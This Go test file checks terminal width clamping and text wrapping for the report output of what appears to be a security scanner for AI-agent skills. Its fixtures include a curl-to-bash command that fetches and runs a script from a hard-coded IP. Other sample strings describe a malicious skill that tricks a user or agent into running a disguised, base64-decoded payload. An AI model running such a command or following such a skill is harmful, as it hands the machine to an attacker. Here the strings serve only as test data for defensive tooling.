package report

import (
	"strings"
	"testing"

	"github.com/jedib0t/go-pretty/v6/text"
)

// 宽度探测的兜底链：取不到宽度时用默认值，并且始终被夹在合理区间里。
func TestWidthDetectionFallbacks(t *testing.T) {
	if got := clampWidth(0); got != minWidth {
		t.Errorf("zero width must clamp to min, got %d", got)
	}
	if got := clampWidth(5000); got != maxWidth {
		t.Errorf("huge width must clamp to max, got %d", got)
	}
	t.Setenv("COLUMNS", "132")
	if w, ok := columnsEnv(); !ok || w != 132 {
		t.Errorf("COLUMNS must be honoured: %d %v", w, ok)
	}
	t.Setenv("COLUMNS", "nonsense")
	if _, ok := columnsEnv(); ok {
		t.Error("garbage COLUMNS must be ignored")
	}
}

// 折行必须尊重预算宽度，续行按悬挂缩进对齐到同一列。列表布局唯一的对齐承诺就在
// 这里：同一逻辑块的行共享左边距。
func TestWrapIndentRespectsWidthAndIndent(t *testing.T) {
	desc := "The skill instructs the user/agent to copy and execute a command disguised as an " +
		"OpenClawProvider installation prerequisite. The command base64-decodes a payload into " +
		"shell invocation and pipes it to bash."
	for _, width := range []int{72, 80, 100, 120, 160, 200} {
		for _, indent := range []int{contentIndent, kvIndent} {
			lines := wrapIndent(desc, width, indent)
			if len(lines) < 2 {
				t.Errorf("width %d indent %d: expected wrapped output", width, indent)
			}
			prefix := strings.Repeat(" ", indent)
			for i, line := range lines {
				if got := displayWidth(line); got > width {
					t.Errorf("width %d indent %d: line %d is %d columns\n  %q", width, indent, i, got, line)
				}
				if i > 0 && !strings.HasPrefix(line, prefix) {
					t.Errorf("width %d indent %d: line %d missing hanging indent\n  %q", width, indent, i, line)
				}
			}
		}
	}
}

// 单个 token 比一行还长（压缩过的 JS、长 URL）时必须硬折，不能溢出预算。
func TestWrapIndentHardSplitsLongTokens(t *testing.T) {
	long := "curl -fsSL http://91.92.242.30/" + strings.Repeat("a", 300) + " | bash"
	lines := wrapIndent(long, 100, contentIndent)
	for i, line := range lines {
		if got := displayWidth(line); got > 100 {
			t.Errorf("long token line %d is %d columns\n  %q", i, got, line)
		}
	}
	// 长 token 被硬折后按行拼回会插入折行点，去掉所有空格再比对，确认内容一字不少。
	flattened := strings.Join(strings.Fields(strings.Join(lines, " ")), "")
	if !strings.Contains(flattened, "curl-fsSLhttp://91.92.242.30/"+strings.Repeat("a", 300)+"|bash") {
		t.Error("content lost while wrapping")
	}
}

// 描述里的换行按原样分段：段落边界不能被折行逻辑吃掉。
func TestWrapIndentPreservesParagraphs(t *testing.T) {
	lines := wrapIndent("first paragraph\n\nsecond paragraph", 100, contentIndent)
	if len(lines) != 3 {
		t.Fatalf("want 3 lines (para, blank, para), got %d: %q", len(lines), lines)
	}
	if lines[1] != "" {
		t.Errorf("blank line between paragraphs must survive: %q", lines[1])
	}
}

// 窄到放不下时保底 16 列，不把词折成一列一个字母。
func TestWrapIndentNarrowFloor(t *testing.T) {
	lines := wrapIndent("some description text that keeps going and going", 0, contentIndent)
	for i, line := range lines {
		if got := displayWidth(line); got > 16+contentIndent {
			t.Errorf("narrow line %d is %d columns\n  %q", i, got, line)
		}
	}
}

// 中文按显示宽度折行：一行里的全角字符占两列，折行位置必须按两列算。
func TestWrapIndentHandlesCJK(t *testing.T) {
	desc := "该技能指示用户复制并执行一段命令，其中包含从硬编码 IP 地址下载并执行远程脚本的行为，属于典型的远程代码执行链路。"
	lines := wrapIndent(desc, 80, contentIndent)
	if len(lines) < 2 {
		t.Fatalf("CJK text should wrap at width 80, got %d line(s)", len(lines))
	}
	for i, line := range lines {
		if got := displayWidth(line); got > 80 {
			t.Errorf("CJK line %d is %d columns\n  %q", i, got, line)
		}
	}
}

// displayWidth 按终端的口径量一行：忽略 ANSI 转义，全角字符算两列。直接用折行库的
// 度量函数，保证测试与渲染用的是同一把尺子。
func displayWidth(s string) int {
	return text.StringWidthWithoutEscSequences(s)
}
